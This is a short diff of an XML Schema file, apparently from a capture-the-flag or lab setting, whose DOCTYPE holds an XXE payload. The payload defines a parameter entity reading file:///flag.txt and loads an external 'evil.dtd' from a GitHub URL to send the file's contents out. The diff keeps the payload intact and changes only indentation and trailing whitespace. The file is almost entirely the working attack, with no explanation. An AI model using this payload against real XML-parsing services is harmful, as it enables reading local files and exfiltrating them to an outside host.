@@ -1,9 +1,12 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE xs:schema [
-  <!ENTITY % file SYSTEM "file:///flag.txt">
-  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pwntester/xxe/refs/heads/main/evil.dtd">
-%dtd;
-]>
-<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="http://www.example.com/test" xmlns="http://www.example.com/test" elementFormDefault="qualified">
-  <xs:element name="test" type="xs:string"/>
+<?xml version="1.0" encoding="UTF-8"?>                                          
+<!DOCTYPE xs:schema [                                                                               
+    <!ENTITY % file SYSTEM "file:///flag.txt">                                                      
+    <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pwntester/xxe/refs/heads/main/evil.dtd">                                  
+    %dtd;                                                                                           
+]>                                                                                                  
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"                                              
+           targetNamespace="http://www.example.com/test"                                            
+           xmlns="http://www.example.com/test"                                                      
+           elementFormDefault="qualified">                                                          
+    <xs:element name="test" type="xs:string"/>                                                      
 </xs:schema>
